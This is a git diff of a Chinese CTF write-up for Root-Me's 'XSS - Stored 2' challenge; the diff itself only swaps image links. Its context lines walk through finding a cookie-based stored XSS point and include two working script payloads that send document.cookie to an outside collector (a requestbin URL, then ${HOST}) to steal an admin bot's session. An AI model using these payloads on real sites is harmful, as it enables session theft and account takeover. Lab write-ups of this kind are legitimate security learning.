@@ -21,7 +21,7 @@
 - 输入的 Content
 - 右上角的 Status 值（**似乎固定为 invite？其实不然！**）
 
-![](http://exp-blog.com/wp-content/uploads/2019/01/c524d40fcfdb1200ffdec983e5260bcb.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Client/%5B15%5D%20%5B50P%5D%20XSS%20-%20Stored%202/imgs/01.png)
 
 > 多刷新几次页面，不难注意到这台靶机后台有个 admin-robot 在定时读取提交的消息。
 
@@ -32,16 +32,16 @@
 - 切到 Network 查看页面cookie ，发现 `status=invite` 是其中一个  cookie 值（另一个是当前用户的 `uid`）。
 - 切到 Elements  查看提交回显的内容，发现 `invite` 是 &lt;i&gt; 标签的 class 值
 
-![](http://exp-blog.com/wp-content/uploads/2019/01/22b83f43ef64024795b50d6a09282f36.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Client/%5B15%5D%20%5B50P%5D%20XSS%20-%20Stored%202/imgs/02.png)
 
-![](http://exp-blog.com/wp-content/uploads/2019/01/b83b05eb759e7c1742160cf4c1816621.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Client/%5B15%5D%20%5B50P%5D%20XSS%20-%20Stored%202/imgs/03.png)
 
 
 ------------
 
 使用 Burp Suite -> Repeater 任意修改 cookie 的 `status` 值后再发送请求，发现回显的内容中的 &lt;i&gt; 标签的 class 值也随之改变，说明**这就是 XSS 注入点**。
 
-![](http://exp-blog.com/wp-content/uploads/2019/01/ee5593eb672ad2f7264620e15a5c647c.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Client/%5B15%5D%20%5B50P%5D%20XSS%20-%20Stored%202/imgs/04.png)
 
 
 ------------
@@ -50,9 +50,9 @@
 
 通过 Burp Suite -> Repeater 提交，页面弹出警告对话框，注入成功。
 
-![](http://exp-blog.com/wp-content/uploads/2019/01/04033e37798966756844a166938ff6e5.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Client/%5B15%5D%20%5B50P%5D%20XSS%20-%20Stored%202/imgs/05.png)
 
-![](http://exp-blog.com/wp-content/uploads/2019/01/d975300b28ff63a24cc954b5160a796b.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Client/%5B15%5D%20%5B50P%5D%20XSS%20-%20Stored%202/imgs/06.png)
 
 ------------
 
@@ -66,13 +66,13 @@
 
 `"><script>document.write(%22<img src=http://requestbin.fullcontact.com/q9vld7q9?%22.concat(document.cookie).concat(%22 />%22))</script>`
 
-![](http://exp-blog.com/wp-content/uploads/2019/01/505f42c6b21457d6e339739e9a61eb1e.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Client/%5B15%5D%20%5B50P%5D%20XSS%20-%20Stored%202/imgs/07.png)
 
 ------------
 
 提交 payloads 后，好不容易等到  admin-robot 读取了消息，但是在 HTTP 服务器查看  admin-robot 发送过来的请求却发现，cookie 只有 `status` 参数，缺失了最重要的 `uid` 参数。
 
-![](http://exp-blog.com/wp-content/uploads/2019/01/57f014f92a52eff6c6b7833afdc5d874.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Client/%5B15%5D%20%5B50P%5D%20XSS%20-%20Stored%202/imgs/08.png)
 
 
 ------------
@@ -87,10 +87,10 @@
 - 前半部分的 `status` 作为 &lt;img&gt; 标签的 `src` 属性被提交到 HTTP 服务器
 - 后半部分的 `uid` 则成为 &lt;img&gt; 标签的一个独立属性
 
-![](http://exp-blog.com/wp-content/uploads/2019/01/c3697edb648aafa09f882a5bb4f6f036.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Client/%5B15%5D%20%5B50P%5D%20XSS%20-%20Stored%202/imgs/09.png)
 
 
-![](http://exp-blog.com/wp-content/uploads/2019/01/9c0d233b92d408aae74810eea87c5f7a.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Client/%5B15%5D%20%5B50P%5D%20XSS%20-%20Stored%202/imgs/10.png)
 
 ------------
 
@@ -100,14 +100,14 @@
 
 `"><script>document.write(%22<img src=${HOST}?%22.concat(document.cookie.replace(%22 %22,%22&%22)).concat(%22 />%22))</script>`
 
-![](http://exp-blog.com/wp-content/uploads/2019/01/addc0175089549bbc2a9d65b0dfddfef.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Client/%5B15%5D%20%5B50P%5D%20XSS%20-%20Stored%202/imgs/11.png)
 
 ------------
 
 
 提交后成功从 HTTP 服务器收到 `ADMIN_COOKIE` ：
 
-![](http://exp-blog.com/wp-content/uploads/2019/01/d31f04abf0f90aa021e0b4a594d63f13.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Client/%5B15%5D%20%5B50P%5D%20XSS%20-%20Stored%202/imgs/12.png)
 
 ------------
 
@@ -123,7 +123,7 @@
 
 得到密码，完成挑战。
 
-![](http://exp-blog.com/wp-content/uploads/2019/01/e287b895021a2c2134c516cfa3dab970.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Client/%5B15%5D%20%5B50P%5D%20XSS%20-%20Stored%202/imgs/13.png)
 
 ------
 
